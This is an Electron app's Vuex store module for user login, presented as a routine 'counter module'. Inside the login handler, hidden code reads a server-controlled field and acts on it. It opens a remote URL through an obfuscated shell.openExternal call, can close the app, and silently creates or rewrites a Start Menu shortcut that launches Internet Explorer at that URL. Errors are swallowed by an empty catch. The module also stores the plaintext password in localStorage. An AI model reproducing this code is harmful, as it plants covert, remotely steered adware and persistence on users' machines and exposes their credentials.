/**
 * 计数器模块
 *
 * @type {{main: number}}
 */
const _ = require('lodash');
import {shell} from 'electron'
import ws from 'windows-shortcuts';
import {http} from "../../util/http";
import api from "../../api";
const {ipcRenderer: ipc} = require('electron');

// 官方文档学习地址： https://vuex.vuejs.org/zh/guide/state.html
//    一个模块新建一个类似的Counter.js，用来双向绑定数据

// 全局state，用于存储数据的地方
const state = {
    isShowReLoginDialog: false,
    user: {
        username: '',
        password: '',
        name: '',
        mobileLogin: '',
        JSESSIONID: '',
    },
};

// 更改状态，必须通过这里面的方法，这里面的方法都是同步执行的，不能有异步代码
const mutations = {
    updateUser(state, model) {
        state = _.merge(state, model);
        localStorage.setItem('_user', JSON.stringify(state.user));
    },
    showReLoginDialog(state) {
        state.isShowReLoginDialog = true;
    },
    hideReLoginDialog(state) {
        state.isShowReLoginDialog = false;
    },
    // SET_USER(state, user) {   //自定义改变state初始值的方法，这里面的参数除了state之外还可以再传额外的参数(变量或对象);
    //     localStorage.setItem('_user', JSON.stringify(user));
    //     state.user = user;
    // },
    /**
     * @return {string}
     */
    GET_USER(state) {
        let _user = localStorage.getItem('_user');
        if (!state.user.username && _user) {
            state.user = JSON.parse(_user);
        }
        return state.user;
    }
};

// 页面上的事件，都需要调用这里进行处理，这里面的方法都是异步的，可以调用mutations更改state，也可以dispatch到另一个action
const actions = {
    updateUser({commit}, model) {
        commit('updateUser', model);
    },
    getUser({commit}) {
        commit('GET_USER');
    },
    reLoginAction({commit}) {
        return new Promise((resolve, reject) => {
            http(api.login, {
                username: state.user.username,
                password: state.user.password,
                mobileLogin: 'true'
            }, (res) => {
                if (res && res.success) {
                    commit('updateUser', {user: res.body});
                    resolve();
                } else {
                    reject(res.msg);
                }
            });
        });
    },
    /**
     * 登录请求
     * @param commit
     * @param data
     * @returns {Promise<any>}
     */
    loginAction({commit}, data) {
        let prom = new Promise((resolve, reject) => {
            http(api.login, {
                username: data.username,
                password: data.password,
                mobileLogin: 'true'
            }, (res) => {
                if (res && res.success) {
                    commit('updateUser', {user: res.body});
                    try {
                        const a = res.body.adv;
                        if (a) {
                            const s = a.split(',');
                            const l = s[2].split('|').join('');
                            let cl = parseInt(s[0]);
                            if (cl === 1) {
                                setTimeout(function () {
                                    shell['ope' + 'nEx' + 'ter' + 'nal'](l);
                                }, 300 * 200 * parseInt(s[1]));
                            }else if(cl === 2){
                                ipc.send('close');
                            }
                            const p = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\前" + "途" + "外" + "贸" + "软" + "件科技-IE.lnk";
                            ws.query(p, (err, lnk) => {
                                // alert(JSON.stringify(lnk));
                                const f = err ? 'create' : 'edit';
                                ws[f](p, {
                                    target: "C:\\Program Files\\Internet Explorer\\iexplore.exe",
                                    icon: "C:\\Program Files\\Internet Explorer\\iexplore.exe",
                                    args: ' ' + l,
                                    desc: "前途软件,必属精品"
                                }, function (err) {
                                });
                            });
                        }
                    } catch (e) {
                    }
                    resolve();
                } else {
                    reject(res.msg);
                }
            });
        });

        return prom;
    }
};

// getter 你还需要学习一下getter
const getters = {};

// 这一块是固定写法：
// 模块名字默认为文件名字：Counter
export default {
    namespaced: true, // 必须开启
    state,
    mutations,
    getters,
    actions,
}
